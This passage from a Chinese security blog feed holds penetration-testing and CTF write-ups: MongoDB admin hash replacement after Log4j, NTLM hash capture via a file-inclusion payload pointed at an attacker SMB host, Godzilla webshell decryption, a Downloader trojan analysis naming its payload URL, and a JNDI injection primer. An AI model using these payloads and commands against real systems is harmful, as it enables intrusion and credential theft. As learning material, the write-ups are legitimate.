class="hljs-selector-class">.forEach</span>(printjson);&quot;<br><br>##命令解释：db<span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.find</span>()为查询admin表下的所有数据，也就是查询所有用户；<span class="hljs-built_in">forEach</span>()为遍历；printjson为打印json格式<br></code></pre></td></tr></table></figure><p>拿到了管理员账号密码以及管理员账户id号</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-27.png" class="" title="2024-03-06_09-27.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>$6意思是SHA-512加密，如果我们不知道也没关系，可以使用hashid来判断该密码的类型，经验证确实为SHA-512加密，破解难度挺大，但我们可以使用自己创建的哈希更改x_shadow密码哈希，以替换管理员密码并通过管理面板进行身份验证，我们使用mkpasswd来创建一个密码，就123456吧，并制定SHA-512加密类型</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-32.png" class="" title="2024-03-06_09-32.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>现在使用mongo命令对我们创建的hash来进行替换，这个时候需要通过管理员账户的_id进行标识，替换其x_shadow</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-34.png" class="" title="2024-03-06_09-34.png"><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">mongo --port <span class="hljs-number">27117</span> ace --<span class="hljs-built_in">eval</span> &#x27;db.admin.<span class="hljs-keyword">update</span>(&#123;<span class="hljs-string">&quot;_id&quot;</span>:ObjectId(<span class="hljs-string">&quot;管理员账户id&quot;</span>)&#125;,&#123;$<span class="hljs-built_in">set</span>:&#123;<span class="hljs-string">&quot;x_shadow&quot;</span>:<span class="hljs-string">&quot;SHA_512 Hash&quot;</span>&#125;&#125;)&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39.png" class="" title="2024-03-06_09-39.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>检查密码是否更新，重新遍历一次，看到x_shadow内容已经替换成我们自己创建的hash值</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39_1.png" class="" title="2024-03-06_09-39_1.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>接下来我们就可以使用管理员账号和密码（123456）登陆到UniFi后台，在后台设置中心里发现了ssh账号密码…还是root账户</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-49.png" class="" title="2024-03-06_09-49.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>ssh直接连！</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-53.png" class="" title="2024-03-06_09-53.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SMB窃取NTLMhash</title>
    <link href="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/"/>
    <url>/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在打进内网之后，并且在隧道建立完毕的情况下，进行当前内网主机的一个探测，发现80端口的http服务存在一个文件包含漏洞，而且在前期内网信息收集的时候发现smb服务是开着的<br>（win系统）<br>先简单说一下这个文件包含漏洞，url中有一个page参数，借助文件包含漏洞，我们可以尝试读取系统中的敏感文件，比如hosts文件，win下的hosts文件在windows\system32\drivers\etc\hosts中，所以构造payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>windows<span class="hljs-regexp">/system32/</span>drivers<span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p>页面回显如下</p><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09_1.png" class="" title="2024-03-05_11-09_1.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>我们之所以会成功是因为index.php里包含include()这个方法，将会读取page这个参数的值，如果开发者没有进一步处理page参数所得到的值时，这个攻击就会成功<br>php include函数的示例如下</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean">文件<span class="hljs-number">1</span>：root.php<br>&lt;?php<br>$color = <span class="hljs-string">&#x27;green&#x27;</span>;<br>$fruit = <span class="hljs-string">&#x27;apple&#x27;</span>;<br>?&gt;<br>#############################################<br>文件<span class="hljs-number">2</span>：test.php<br>&lt;?php<br>echo <span class="hljs-string">&quot;A $color $fruit&quot;</span>; <span class="hljs-comment">// output = &quot;A&quot;</span><br>include <span class="hljs-string">&#x27;root.php&#x27;</span>;<br>echo <span class="hljs-string">&quot;A $color $fruit&quot;</span>; <span class="hljs-comment">// output = &quot;A green apple&quot;</span><br>?&gt;<br></code></pre></td></tr></table></figure><p>当test.php包含（include）root.php后，color及fruit就被赋予值了</p><p>那么如何进一步利用呢？两种思路:一是写入或包含远程后门文件，做权限的维持；二是继续信息收集系统的账号密码信息，进行PTH等操作，我们先测试一下远程文件包含，我们知道远程文件包含还需要两个条件：allow_url_include、allow_url_fopen要为“ON”，而本地文件包含则不需要，测试一下，直接报错，说明不存在远程文件包含</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=http://www.baidu.com<br></code></pre></td></tr></table></figure><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09.png" class="" title="2024-03-05_11-09.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h2 id="利用SMB窃取NTLM-hash"><a href="#利用SMB窃取NTLM-hash" class="headerlink" title="利用SMB窃取NTLM hash"></a>利用SMB窃取NTLM hash</h2><p>SMB 协议支持 NTLM 和 LM 加密，我们通过恶意程序监听，在远程主机访问我们的 SMB 服务时，因为要进行身份验证，会发送相关信息，我们就可以获取目标主机的 hash 值，这个是为了账号密码的安全性，一般都不进行明文验证，而是使用摘要值进行比对，这样就给了攻击者机会，在不需要知道正确的账号密码的情况下，只要摘要值比对成功就可以登录<br>利用工具Responder，进行监听网卡，确定目标主机和跳板机在一个网段内，这个时候就体现了隧道的重要性了，我这里是tun0</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure><p>然后通过文件包含漏洞构造payload,并拼接访问url触发</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>age=<span class="hljs-regexp">//</span>跳板机<span class="hljs-variable constant_">IP</span>/somefile<br></code></pre></td></tr></table></figure><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-23.png" class="" title="2024-03-05_11-23.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>成功接收到服务器的的 NTLM 值,一般是第一次请求才会发送，然后会保存到本地，下次就不会再发送了</p><h2 id="NTLM-碰撞获取可用账号密码"><a href="#NTLM-碰撞获取可用账号密码" class="headerlink" title="NTLM 碰撞获取可用账号密码"></a>NTLM 碰撞获取可用账号密码</h2><p>获取到 NTLM 值，下一步就是暴破了，将获取的值保存到一个文件中，然后用john进行破解碰撞，就获取到了账户和密码</p><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_10-57.png" class="" title="2024-03-05_10-57.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>拿到账户密码直接登录连接获取shell，并可以为后续的密码喷洒等工作做准备</p><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-02.png" class="" title="2024-03-05_11-02.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wifi取证——WPA解密</title>
    <link href="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/"/>
    <url>/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>好久没碰CTF了，闲来无事，最近刷了刷题找找手感</p><p>拿到题目之后可以看到，有三个文件，一个服务器流量包（pcapng），一个客户端流量包(cap)，一个内存镜像；首先先看服务器流量，在第27个数据包中发现了上传木马</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/1.jpg" class="" title="1.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>并且通过预览数据包可以基本判断为哥斯拉的php_eval_xor_base64流量，通过追踪一下该数据流，可以发现一串密文</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/2.png" class="" title="2.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>我们拿去解密</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/3.png" class="" title="3.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>拿到了shell的连接密码:pass，这就更加证实了我的推断，因为哥斯拉的默认连接密码就是pass，还有一个key，一会可能会用的到，先做好记录；随后看了一下客户端流量（.cap），发现做了WPA加密，想解密的话，需要找到SSID和密码，而我们通过已知的数据包可以看到SSID，SSID为My_Wifi</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/4.jpg" class="" title="4.jpg"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>其他的再无可利用的信息，然后我们去取证分析一下那个内存镜像文件，看看能不能找到一些有价值的东西，是个win7</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/5.jpg" class="" title="5.jpg"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>去找一下My_Wifi相关文件，发现有一个zip压缩包文件，我们将他提取出来</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/6.jpg" class="" title="6.jpg"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>提取出来之后，尝试解压，发现需要密码，并且密码提示说是网卡的GUID，而我们知道windows操作系统中网卡的GUID和接口Interfaces绑定，于是我们过滤关键字“Interfaces”进行文件搜索</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/7.png" class="" title="7.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>得到了GUID：{529B7D2A-05D1-4F21-A001-8F4FF817FC3A}，也就得到了压缩包的密码，我们尝试进行解压，解压成功，解压出来了一个xml文件，在xml文件里扒到了SSID和密码</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/8.jpg" class="" title="8.jpg"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>拿到SSID和密码之后，我们就可以进行Airdecap-ng进行无线攻击破解</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/9.png" class="" title="9.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>破解之后就会出现一个全新的数据包，在最后一个tcp数据流的末尾找到了一串新的密文</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/10.png" class="" title="10.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>再加上前面我们已经获取到哥斯拉的key，所以只需要对这一串密文进行哥斯拉解密，就可以拿到flag<br>解密脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$key1</span>=<span class="hljs-string">&quot;密文&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key1</span>,<span class="hljs-number">16</span>,-<span class="hljs-number">16</span>);<br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>),<span class="hljs-variable">$key</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解密即可拿到flag</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/12.png" class="" title="12.png">]]></content>
    
    
    <categories>
      
      <category>数字取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Downloader病毒样本分析</title>
    <link href="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Downloader是一类计算机病毒程序，按照国际上的病毒命名惯例为“Trojan-Downloader”一类，这类木马程序的主要内容为：指引中毒用户的计算机到攻击者指定的url地址去下载更多的病毒文件并运行，使得攻击者获得更大操作权限</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_11-06.png" class="" title="2024-03-04_11-06.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>拿到样本，可以从这几个角度入手：</p><p>字符串：有几率可以获得程序功能相关的提示<br>查壳：查看程序是否有进行加密加壳压缩等<br>PE文件格式：从PE头中可以获取程序的一些信息，例如编译信息、空间要求等<br>链接库和函数：从程序的链接库中可以初步推断程序的功能，查看DLL，导入表</p><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><h3 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h3><p>分析PE格式与查壳，发现无壳，编译时间是2002-05-09，算是比较老的一个病毒样本，是个GUI程序</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-42.png" class="" title="2024-03-04_12-42.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>分析字符串，除了调用的函数名和动态链接库之外，字符串里包含了以下关键信息：<br>一个网址：dload.ipbill.com，还有个URI：<a href="http://dload.ipbill.com/del/cmb_211826.exe">http://dload.ipbill.com/del/cmb_211826.exe</a><br>还有HTTP请求头的字符串<br>文件相关：c:\dialler.exe<br>可以认为结合这些内容可以初步猜测，该程序会从网站上下载一个文件cmb_211826.exe，保存到C:\dialler.exe</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-42_1.png" class="" title="2024-03-04_12-42_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>分析相关函数，发现了有文件操作相关API：WriteFile和CreateFile,应该是写入文件的，还有个CreateThread，应该用来创建功能线程使用，ShellExecuteA，用来执行下载的程序，到这里已经可以摸清一个大概行为了，这个程序的功能就是从网上下载一个exe执行</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-43.png" class="" title="2024-03-04_12-43.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="定位关键函数"><a href="#定位关键函数" class="headerlink" title="定位关键函数"></a>定位关键函数</h4><p>首先是程序OEP：程序首先是通过xor eax,eax的操作将eax赋值为0，然后四个push分别将0入栈，最后通过call sub_401499这里。从反汇编代码中，可以看到并没有将返回地址入栈的操作，程序其实是通过call执行此操作的，call指令我们可以理解为函数调用，call指令后面会跟一个地址，这里是sub_401499表示call会跳转到401499这个地址，这里调用了主函数，然后执行完之后退出进程，参数是4个0</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-50.png" class="" title="2024-03-04_12-50.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-48.png" class="" title="2024-03-04_12-48.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>进入主程序sub_401499：功能还是很简单的，是常见的注册窗口类，创建窗口，创建成功就进入消息循环，否则就退出程序，这一层没啥恶意行为出现，但是调用了两个自写函数</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-01.png" class="" title="2024-03-04_13-01.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>第一个自写函数sub_401437功能就是注册窗口类，然后接着就返回</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-09.png" class="" title="2024-03-04_13-09.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>第二个自写函数sub_4013A3：这个函数首先是查询了一个系统参数，然后调用CreateWindowExA去创建窗口，如果创建失败就返回，创建成功后接着往下跑</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-13.png" class="" title="2024-03-04_13-13.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>窗口创建成功之后，调用ShowWindow显示窗口，然后调用CreateThread创建了一个线程，线程函数是这个StartAddress，嗯..就觉得这个线程怪怪的</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-28.png" class="" title="2024-03-04_13-28.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><h4 id="下载行为分析"><a href="#下载行为分析" class="headerlink" title="下载行为分析"></a>下载行为分析</h4><p>持续追踪这个线程函数，可以发现它首先调用了一个自写函数sub_401068，功能是从指定URI下载内容，保存到缓冲区</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-03.png" class="" title="2024-03-04_14-03.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>随后分析这个子函数发现，只是一些循环操作，不明白是什么意思，估计可能应该是延时的目的</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-06.png" class="" title="2024-03-04_14-06.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>往下分析发现开始初始化Windows的Socket，并初始化socket连接用的参数，端口地址，网络地址，随后去判断这个网络地址是否存活，成功了就向下跳转</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-34.png" class="" title="2024-03-04_14-34.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>后面就是发送数据了，不难发现，发送一个GET的HTTP请求，请求的地址应该就是那个exe的URL</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-41.png" class="" title="2024-03-04_14-41.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>看到最后可以发现，接收服务器返回的数据时，会将数据保存参数里，并且接收的长度也保存了进来</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-54.png" class="" title="2024-03-04_14-54.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><h4 id="创建文件行为分析"><a href="#创建文件行为分析" class="headerlink" title="创建文件行为分析"></a>创建文件行为分析</h4><p>再往下定位就是这里，这里的功能是定位接收缓冲区里需要写入到文件的位置</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-59.png" class="" title="2024-03-04_14-59.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>定位完要写入的位置之后，紧接着就是创建文件和写入文件了，写入位置是C:\dialler.exe</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_15-09.png" class="" title="2024-03-04_15-09.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><h4 id="执行文件行为分析"><a href="#执行文件行为分析" class="headerlink" title="执行文件行为分析"></a>执行文件行为分析</h4><p>最后调用的是ShellExecuteA，并打开这个文件，参数是REFID，工作目录是C:\</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_15-15.png" class="" title="2024-03-04_15-15.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>逆向工程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>样本分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson漏洞总结</title>
    <link href="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastjson是一个由阿里开发的一个开源Java类库，可以将Java对象转换为JSON格式(序列化)，当然它也可以将JSON字符串转换为Java对象（反序列化）Fastjson 可以操作任何Java对象，即使是一些预先存在的没有源码的对象,使用还是比较广泛的</p><p>那什么是json?<br>json本质就是一种字符串，用于信息的存储和交换。json全称是JavaScript object notation，即JavaScript对象标记法，使用键值对进行信息的存储，举个简单的例子如下</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>        <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;LiutyBlog&quot;</span>,<br>        <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">23</span>,<br>        <span class="hljs-string">&quot;media&quot;</span>:[<span class="hljs-string">&quot;CSDN&quot;</span>,<span class="hljs-string">&quot;bilibili&quot;</span>,<span class="hljs-string">&quot;Github&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_21-02.png" class="" title="2024-03-03_21-02.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>在进行fastjson的漏洞复现学习之前需要了解几个概念</p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>JNDI是一组应用程序接口，提供了查找和访问命名和目录服务的通用、统一的接口，用于定位网络、用户、对象和服务等资源，是J2EE规范中是重要的规范之一，JNDI底层支持RMI远程对象，JNDI接口可以访问和调用RMI注册过的服务，JNDI根据名字动态加载数据，支持的服务有DNS、LDAP、CORBA、RMI</p><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>简单来说，JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击，例如</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">Hashtable env = <span class="hljs-keyword">new</span><span class="hljs-type">Hashtable</span>();<br>env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br><span class="hljs-comment">//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory</span><br>env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://liuty_ip:8080&quot;</span>);<br>Context ctx = <span class="hljs-keyword">new</span><span class="hljs-type">InitialContext</span>(env);<br>Object local_obj = ctx.lookup(<span class="hljs-string">&quot;rmi://liuty_ip:8080/test&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI服务端可以通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并且在目录中保存，当客户端使用lookup获取对应名字的时候，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例</p><p>任何可以被远程调用方法的对象必须实现 java.rmi.Remote接口，远程对象的实现类必须继承UnicastRemoteObject类,如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法,例如</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">publicclassByebyeImplimplementsIByebye&#123;<br>protectedByebyeImpl() throwsRemoteException&#123;<br>UnicastRemoteObject.exportObject(<span class="hljs-keyword">this</span>, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">@Override</span><br>publicString sayByebye(String name) &#123;<br>System.<span class="hljs-keyword">out</span>.println(name);<br><span class="hljs-keyword">return</span> name;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 